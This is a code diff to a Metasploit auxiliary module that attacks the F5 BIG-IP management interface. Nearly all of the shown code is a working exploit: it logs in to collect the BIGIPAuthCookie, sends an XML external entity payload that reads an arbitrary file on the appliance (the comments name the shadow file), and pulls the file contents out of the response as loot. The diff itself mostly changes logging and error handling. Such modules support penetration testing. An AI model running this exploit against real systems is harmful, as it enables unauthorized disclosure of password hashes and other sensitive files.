@@ -71,25 +71,23 @@ class Metasploit4 < Msf::Auxiliary
 			'method'  => 'GET'})
 
 		if not res
-			print_error("#{rhost}:#{rport} Unable to connect")
+			vprint_error("#{rhost}:#{rport} Unable to connect")
 			return
 		end
 		# Next login to the F5 with valid credentials and grab a valid cookie header.
-		validcookie = getlogincookie(ip, datastore['USERNAME'], datastore['PASSWORD'])
-		# Now with a valid cookie, attempt to do XML attack and access shadow file.
-		if not validcookie
-			print_error("Failed to retrieve a valid cookie")
-			return :abort
-		else
-			accessfile(ip, validcookie)
+		cookies = getlogincookies(datastore['USERNAME'], datastore['PASSWORD'])
+		if cookies.nil?
+			fail_with(Exploit::Failure::Unknown, "Failed to retrieve the session cookie")
 		end
+		# With a valid cookie, attempt to do XML attack and access shadow file.
+		accessfile(ip, cookies)
 	end
 
-	def getlogincookie(rhost, user, pass)
-		print_status("Attempting login with '#{user}' : '#{pass}'")
+	def getlogincookies(user, pass)
+		vprint_status("Attempting login with '#{user}' : '#{pass}'")
 		begin
 			uri = normalize_uri(datastore['LOGINURI'])
-		        print_status("Acessing Login URI:'#{uri}'")
+			vprint_status("Acessing Login URI:'#{uri}'")
 			res = send_request_cgi(
 			{
 				'uri'    => uri,
@@ -100,69 +98,61 @@ class Metasploit4 < Msf::Auxiliary
 				}
 
 			})
-			if not res or res.code != 302
-				print_status("FAILED LOGIN. with code #{res.code}")
-				return :skip_pass
+			if not res or res.code != 302 or res.headers['Location'] =~ /\/login\.jsp/
+				print_status("FAILED LOGIN.")
+				return nil
 			end
-			if res.headers['Location'] =~ /\/login\.jsp/
-				print_status("FAILED LOGIN. with code #{res.code}")
-				return :skip_pass
-			else # Get login succeeded and we need to get the cookie
-				print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
-				res.headers['Set-Cookie'].split(';').each {|c|
-					c.split(',').each {|v|
-						kv = v.split('=')
-						if kv[0] =~ /BIGIPAuthCookie/
-							print_good("FOUND BIGIPAuthCookie. '#{kv[1]}'")
-							return kv[1]
-						end
-					}
-				}
+			# Login succeeded and we need to look for the cookie
+			if res.headers.include?('Set-Cookie') and res.headers['Set-Cookie'] =~ /BIGIPAuthCookie/
+				print_good("SUCCESSFUL LOGIN AND RETRIEVED BIGIPAuthCookie.")
+				return res.get_cookies
+			else
+				return nil
 			end
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-			print_error("HTTP Connection in getlogincookie Failed, Aborting")
-			return :abort
+			vprint_error("HTTP Connection in getlogincookie Failed, Aborting")
+			return nil
 		end
 	end
 
-	def accessfile(rhost, validcookie)
+	def accessfile(rhost, cookies)
 		uri = normalize_uri(target_uri.path)
-		print_status("#{rhost}:#{rport} Connecting to F5 BIG-IP Interface")
+		vprint_status("#{rhost}:#{rport} Connecting to F5 BIG-IP Interface")
 		begin
 			entity = Rex::Text.rand_text_alpha(rand(4) + 4)
-	
+
 			data =  "<?xml  version=\"1.0\" encoding='utf-8' ?>" + "\r\n"
 			data << "<!DOCTYPE a [<!ENTITY #{entity} SYSTEM '#{datastore['RFILE']}'> ]>" + "\r\n"
 			data << "<message><dialogueType>&#{entity};</dialogueType></message>" + "\r\n"
-	
+
 			res = send_request_cgi({
 					'uri'      => uri,
 					'method'   => 'POST',
 					'ctype'    => 'text/xml; charset=UTF-8',
-					'cookie'   => "BIGIPAuthCookie=#{validcookie}",
+					'cookie'   => cookies,
 					'data'     => data,
 					})
 
 			if not res # Check for empty result
-				print_error("#{rhost}:#{rport} Empty Result.")
-				return :abort
+				vprint_error("#{rhost}:#{rport} Empty Result.")
+				return
 			end
 
 			if res.code == 302 # Should never happen, but check for bad login cookie
-				print_error("Bad Cookie Provided: #{validcookie}")
-				return :abort
+				vprint_error("Bad Cookie Provided.")
+				return
 			end
 
-			if res and res.code == 200 # Good result, but still my not be vulnerable
+			if res.code == 200 # Good result, but still my not be vulnerable
 				body = res.body
 				if not body or body.empty?
-					print_status("Retrieved empty file from #{rhost}:#{rport}")
-					return :abort
+					vprint_status("Retrieved empty file from #{rhost}:#{rport}")
+					return
 				end
 
 				if body =~ /Bad request/ # Not Vulnerable
-					print_error("#{rhost}:#{rport} not vulnerable.")
-					return :abort
+					vprint_error("#{rhost}:#{rport} not vulnerable.")
+					return
 				end
 
 				if body =~ /generalError/ # Vulnerable unless patched.
@@ -177,8 +167,8 @@ class Metasploit4 < Msf::Auxiliary
 							loot = lootnode.value[38..-2]
 							if loot.empty? # Probably a patched F5
 
-								print_error("LOOT Empty.  F5 BIG-IP is Likely Patched")
-								return :abort
+								vprint_error("LOOT Empty.  F5 BIG-IP is Likely Patched")
+								return
 							end
 						end
 					end
@@ -195,10 +185,9 @@ class Metasploit4 < Msf::Auxiliary
 				end
 			end
 		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-			print_error("HTTP Connection in accessfile Failed, Aborting")
-			return :abort
+			vprint_error("HTTP Connection in accessfile Failed, Aborting")
+			return
 		end
-		print_error("#{rhost}:#{rport} Failed to retrieve file from #{rhost}:#{rport}")
+		vprint_error("#{rhost}:#{rport} Failed to retrieve file from #{rhost}:#{rport}")
 	end
-
 end
